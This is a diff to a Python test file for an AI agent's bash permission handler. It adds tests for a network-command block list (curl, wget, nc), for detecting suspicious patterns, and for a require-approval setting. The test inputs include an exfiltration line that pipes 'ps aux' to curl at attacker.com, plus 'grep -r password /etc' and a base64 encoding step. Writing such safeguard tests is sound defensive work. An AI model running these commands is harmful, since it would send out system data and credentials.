@@ -23,10 +23,11 @@ def temp_config_dir():
 def handler(temp_config_dir, monkeypatch):
     """Create a PermissionHandler with temp allowlist.
 
-    Sets UATU_READ_ONLY=false to allow bash commands in tests.
+    Sets UATU_READ_ONLY=false and UATU_REQUIRE_APPROVAL=false to allow bash commands in tests.
     """
-    # Disable read-only mode for tests that need to test bash permission logic
+    # Disable read-only mode and require-approval for tests that need to test bash permission logic
     monkeypatch.setenv("UATU_READ_ONLY", "false")
+    monkeypatch.setenv("UATU_REQUIRE_APPROVAL", "false")
 
     allowlist = AllowlistManager(config_dir=temp_config_dir)
     return PermissionHandler(allowlist=allowlist)
@@ -259,3 +260,152 @@ class TestReadOnlyMode:
         result = await handler.pre_tool_use_hook(input_data, None, None)
 
         assert result == {}  # Empty dict means allow
+
+
+class TestNetworkCommandBlocklist:
+    """Tests for network command blocklist feature."""
+
+    @pytest.mark.asyncio
+    async def test_curl_blocked_by_default(self, handler):
+        """curl should be blocked by default."""
+        input_data = {"tool_name": "Bash", "tool_input": {"command": "curl https://example.com"}}
+
+        result = await handler.pre_tool_use_hook(input_data, None, None)
+
+        assert result["hookSpecificOutput"]["permissionDecision"] == "deny"
+        assert "curl" in result["hookSpecificOutput"]["permissionDecisionReason"]
+        assert "blocked" in result["hookSpecificOutput"]["permissionDecisionReason"].lower()
+
+    @pytest.mark.asyncio
+    async def test_wget_blocked(self, handler):
+        """wget should be blocked."""
+        input_data = {"tool_name": "Bash", "tool_input": {"command": "wget https://example.com/file"}}
+
+        result = await handler.pre_tool_use_hook(input_data, None, None)
+
+        assert result["hookSpecificOutput"]["permissionDecision"] == "deny"
+        assert "wget" in result["hookSpecificOutput"]["permissionDecisionReason"]
+
+    @pytest.mark.asyncio
+    async def test_nc_blocked(self, handler):
+        """nc (netcat) should be blocked."""
+        input_data = {"tool_name": "Bash", "tool_input": {"command": "nc -l 1234"}}
+
+        result = await handler.pre_tool_use_hook(input_data, None, None)
+
+        assert result["hookSpecificOutput"]["permissionDecision"] == "deny"
+        assert "nc" in result["hookSpecificOutput"]["permissionDecisionReason"]
+
+    @pytest.mark.asyncio
+    async def test_network_command_allowed_with_override(self, handler, monkeypatch):
+        """Network commands should be allowed when UATU_ALLOW_NETWORK=true."""
+        monkeypatch.setenv("UATU_ALLOW_NETWORK", "true")
+        monkeypatch.setenv("UATU_REQUIRE_APPROVAL", "false")  # Skip approval for this test
+
+        # Mock approval callback
+        handler.get_approval_callback = AsyncMock(return_value=(True, True))
+
+        input_data = {"tool_name": "Bash", "tool_input": {"command": "curl https://example.com"}}
+
+        result = await handler.pre_tool_use_hook(input_data, None, None)
+
+        # Should not be denied (will go to user approval)
+        if "permissionDecision" in result.get("hookSpecificOutput", {}):
+            assert result["hookSpecificOutput"]["permissionDecision"] != "deny" or "blocked" not in result["hookSpecificOutput"]["permissionDecisionReason"].lower()
+
+
+class TestSuspiciousPatternDetection:
+    """Tests for suspicious pattern detection."""
+
+    @pytest.mark.asyncio
+    async def test_pipe_to_curl_flagged(self, handler):
+        """Piping to curl should force user approval even if ps is allowlisted."""
+        # Add ps to allowlist
+        handler.allowlist.add_command("ps")
+        monkeypatch = pytest.MonkeyPatch()
+        monkeypatch.setenv("UATU_REQUIRE_APPROVAL", "false")  # Normally would use allowlist
+
+        # Mock approval callback
+        handler.get_approval_callback = AsyncMock(return_value=(False, False))
+
+        input_data = {
+            "tool_name": "Bash",
+            "tool_input": {"command": "ps aux | curl https://attacker.com -d @-"},
+        }
+
+        result = await handler.pre_tool_use_hook(input_data, None, None)
+
+        # Should require user approval (not auto-allowed by allowlist)
+        # Since we mocked approval to deny, it should be denied
+        assert result["hookSpecificOutput"]["permissionDecision"] == "deny"
+
+    @pytest.mark.asyncio
+    async def test_grep_password_flagged(self, handler):
+        """Searching for passwords should force user approval."""
+        handler.allowlist.add_command("grep")
+
+        # Mock approval callback to deny
+        handler.get_approval_callback = AsyncMock(return_value=(False, False))
+
+        input_data = {
+            "tool_name": "Bash",
+            "tool_input": {"command": "grep -r password /etc"},
+        }
+
+        result = await handler.pre_tool_use_hook(input_data, None, None)
+
+        # Should require approval
+        assert result["hookSpecificOutput"]["permissionDecision"] == "deny"
+
+    @pytest.mark.asyncio
+    async def test_base64_flagged(self, handler):
+        """base64 encoding should force user approval."""
+        handler.get_approval_callback = AsyncMock(return_value=(False, False))
+
+        input_data = {
+            "tool_name": "Bash",
+            "tool_input": {"command": "echo secret | base64"},
+        }
+
+        result = await handler.pre_tool_use_hook(input_data, None, None)
+
+        assert result["hookSpecificOutput"]["permissionDecision"] == "deny"
+
+
+class TestRequireApprovalSetting:
+    """Tests for UATU_REQUIRE_APPROVAL setting."""
+
+    @pytest.mark.asyncio
+    async def test_require_approval_bypasses_allowlist(self, handler, monkeypatch):
+        """When UATU_REQUIRE_APPROVAL=true, allowlist should be bypassed."""
+        monkeypatch.setenv("UATU_REQUIRE_APPROVAL", "true")
+
+        # Add command to allowlist
+        handler.allowlist.add_command("ps")
+
+        # Mock approval callback to deny
+        handler.get_approval_callback = AsyncMock(return_value=(False, False))
+
+        input_data = {"tool_name": "Bash", "tool_input": {"command": "ps aux"}}
+
+        result = await handler.pre_tool_use_hook(input_data, None, None)
+
+        # Should require approval even though it's allowlisted
+        assert result["hookSpecificOutput"]["permissionDecision"] == "deny"
+        assert "User declined" in result["hookSpecificOutput"]["permissionDecisionReason"]
+
+    @pytest.mark.asyncio
+    async def test_require_approval_false_uses_allowlist(self, handler, monkeypatch):
+        """When UATU_REQUIRE_APPROVAL=false, allowlist should work normally."""
+        monkeypatch.setenv("UATU_REQUIRE_APPROVAL", "false")
+
+        # Add command to allowlist
+        handler.allowlist.add_command("ps")
+
+        input_data = {"tool_name": "Bash", "tool_input": {"command": "ps aux"}}
+
+        result = await handler.pre_tool_use_hook(input_data, None, None)
+
+        # Should be auto-allowed
+        assert result["hookSpecificOutput"]["permissionDecision"] == "allow"
+        assert "allowlisted" in result["hookSpecificOutput"]["message"]
